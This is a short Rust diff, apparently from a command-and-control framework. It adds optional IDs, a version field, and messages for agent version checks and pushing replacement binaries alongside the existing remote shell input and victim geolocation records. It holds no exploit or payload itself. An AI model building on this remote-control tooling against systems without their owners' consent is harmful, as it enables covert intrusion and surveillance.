@@ -3,7 +3,7 @@ use std::fmt;
 
 #[derive(Debug, Serialize, Deserialize, sqlx::FromRow, Clone)]
 pub struct Agent {
-    pub id: i32,
+    pub id: Option<i32>,
     pub uuid: String,
     pub ip: String,
     pub username: String,
@@ -20,7 +20,7 @@ impl fmt::Display for Agent {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         write!(
             f,
-            "Agent UUID: {}\nIP: {}\nUsername: {}\nHostname: {}\nOnline: {}\nCountry: {}\nCity: {}\nRegion: {}\nLatitude: {}\nLongitude: {}",
+            "\nAgent UUID: {}\nIP: {}\nUsername: {}\nHostname: {}\nOnline: {}\nCountry: {}\nCity: {}\nRegion: {}\nLatitude: {}\nLongitude: {}",
             self.uuid,
             self.ip,
             self.username,
@@ -88,9 +88,26 @@ pub enum C2Message {
         region: String,
         latitude: f64,
         longitude: f64,
+        version: String,
     },
     ShellInput {
         uuid: String,
         input: String,
     },
+    VersionCheck {
+        uuid: String,
+        agent_version: String,
+    },
+    VersionResponse {
+        version: String,
+    },
+    AgentSoftwareUpdateWithBinary {
+        version: String,
+        binary: Vec<u8>,
+    },
+    UpdateSoftwareWithBinary {
+        version: String,
+        binary: Vec<u8>,
+    },
+    VersionCheckAck {},
 }
